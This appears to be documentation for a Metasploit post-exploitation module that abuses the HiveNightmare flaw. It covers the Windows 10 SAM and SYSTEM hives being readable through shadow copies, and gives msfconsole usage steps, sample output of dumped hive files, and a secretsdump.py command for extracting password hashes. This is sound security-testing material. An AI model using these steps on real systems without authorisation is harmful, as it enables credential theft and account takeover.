## Vulnerable Application

### Description

Due to mismanagement of SAM and SYSTEM hives in Windows 10, it is possible for an unprivileged
user to read those files. But, as they are locked while Windows is running we are not able
to read them directly. The trick is to take advantage of Volume Shadow Copy, which is generally
enabled, to finally have a read access. Once SAM and SYSTEM files are successfully dumped and
stored in `store_loot`, you can dump the hashes with some external scripts like secretsdump.py

### Installation

VSS is probably already enabled on your Windows 10, if you want to be sure you can follow the steps below:

* Open the control panel
* Navigate to `System and Security > System`
* Select `System Protection` from the column on the left
* See in `Protection Settings` list if t drive protection is enabled
* Optionally, select `Create` to "Create a resptore point right now..."
    * This is necessary if the module can not find an existing Shadow Copy file which can be the case if the Windows
      instance is brand new

Be aware that you will need Administrator privileges to follow those steps.
You can read more [here](https://isc.sans.edu/diary/Summer+of+SAM+-+incorrect+permissions+on+Windows+1011+hives/27652).

## Verification Steps


1. Start `msfconsole`
2. `use post/windows/gather/credentials/windows_sam_hivenightmare`
3. `set ITERATIONS <number>` to specify the number of iterations on file index (default is 10)
4. `set FILE_INDEX <number>` optionally if you want to target a specific file index instead of iterating on all indexes in a range
5. `run` the module to exploit the vulnerability and potentially leak SAM and SYSTEM files

## Options

### ITERATIONS

Set ITERATIONS to specify the number of iterations on Shadow Copy file index.
Windows is saving those files under the volume name `HarddiskVolumeShadowCopy<index>`.
By default, this module is bruteforcing that `index` value by trying all values between 0 and 10, which you can change if needed.

### FILE_INDEX

Set FILE_INDEX if you want to target a specific index instead of the default behaviour which bruteforces all indexes in a given range.

## Scenarios

This module was successfully tested on Windows 10 20H2.
See the following output:

```
msf6 post(windows/gather/credentials/windows_sam_hivenightmare) > run

[+] SAM data found in HarddiskVolumeShadowCopy1!
[+] Retrieving files of index 1 as they are the most recently modified...
[+] SAM data saved at /home/smcintyre/.msf4/loot/20210729113916_default_192.168.159.15_windows.sam_763500.bin
[+] SYSTEM data saved at /home/smcintyre/.msf4/loot/20210729113926_default_192.168.159.15_windows.system_202176.bin
[+] SAM and SYSTEM data were leaked!
[*] Post module execution completed
msf6 post(windows/gather/credentials/windows_sam_hivenightmare) > file /home/smcintyre/.msf4/loot/20210729113916_default_192.168.159.15_windows.sam_763500.bin
[*] exec: file /home/smcintyre/.msf4/loot/20210729113916_default_192.168.159.15_windows.sam_763500.bin

/home/smcintyre/.msf4/loot/20210729113916_default_192.168.159.15_windows.sam_763500.bin: MS Windows registry file, NT/2000 or above
msf6 post(windows/gather/credentials/windows_sam_hivenightmare) >
```

Then, you can dump the hashes from leaked files with `secretsdump.py` for instance:
`python3 secretsdump.py -sam <SAM_FILE> -system <SYSTEM_FILE> LOCAL`
